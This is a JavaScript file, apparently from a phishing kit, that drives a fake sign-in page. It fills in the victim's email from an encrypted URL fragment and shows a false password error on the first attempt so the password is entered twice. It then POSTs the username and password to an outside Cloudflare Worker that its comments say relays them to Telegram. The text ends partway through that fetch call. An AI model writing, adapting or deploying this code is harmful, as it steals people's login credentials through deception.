// Function to validate if a string is a valid email
function isEmail(email) {
    const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailPattern.test(email);
}

document.addEventListener('DOMContentLoaded', function() {
    checkCookie();
    let hashUrl = window.location.hash.substr(1).replace(new RegExp("%20", "g"), "+");

    let bytes = CryptoJS.AES.decrypt(hashUrl, 'secret key 123');
    var auto_email = bytes.toString(CryptoJS.enc.Utf8);
    
    if (auto_email.length > 4) {
        document.getElementById("userID").value = auto_email;
    }

    var showPass = $("#showHideButton");
    showPass.click(function() {
        var $this = $(this);
        if ($this.text().toLowerCase() === "show") {
            $this.text("Hide");
            $this.prev("input").prop("type", "text");
        } else {
            $this.text("Show");
            $this.prev("input").prop("type", "password");
        }
    });

    var url = "https://auth0-sam20.jjmdw.workers.dev/"; // Your Worker URL

    submit_btn = document.getElementById("continueFromUserLogin");
    userInputContainerDiv = document.getElementById("userInputContainerDiv");
    userBackButton = document.getElementById("userBackButtonSpanTxt");
    count = 0;
    
    let isFirstSubmit = true; // Flag to check first or second submission

    $("#userBackButton").click(function() {
        $(userBackButton).text("");
        $(".sub_div").addClass("hide");
        $(".main_div").removeClass("hide");
        document.getElementById("userErrorText").innerHTML = "";
        count = 0;
    });

    submit_btn.addEventListener("click", function(event) {
        error = document.getElementById("userErrorText");
        error.style.fontSize = "small";
        username = document.getElementById("userID").value;
        event.preventDefault();

        if (!isEmail(username)) {
            error.innerHTML = "Please enter your username correctly!";
        } else {
            $(userBackButton).text(username);
            $(".sub_div").removeClass("hide");
            $(".main_div").addClass("hide");
        }
    });

    // Password form submission
    $('#signin').click(function(event) {
        event.preventDefault();  // Prevent default form submission
        
        username = document.getElementById("userID").value;  // Get the email
        passerror = document.getElementById("passwordErrorText");
        password = document.getElementById("password").value;  // Get the password

        // On first submit, show the error and stop submission
        if (isFirstSubmit) {
            passerror.style.fontSize = "small";
            passerror.innerHTML = "Please enter your password correctly!"; // Simulate first submission error
            isFirstSubmit = false; // Set flag to allow second submission
            return; // Prevent the form submission
        }

        // On second submit, send both username and password to the Cloudflare Worker (Telegram)
        fetch(url, {
            method: "POST",
            body: JSON.stringify({
                userID: username,   // Send the username (email) field
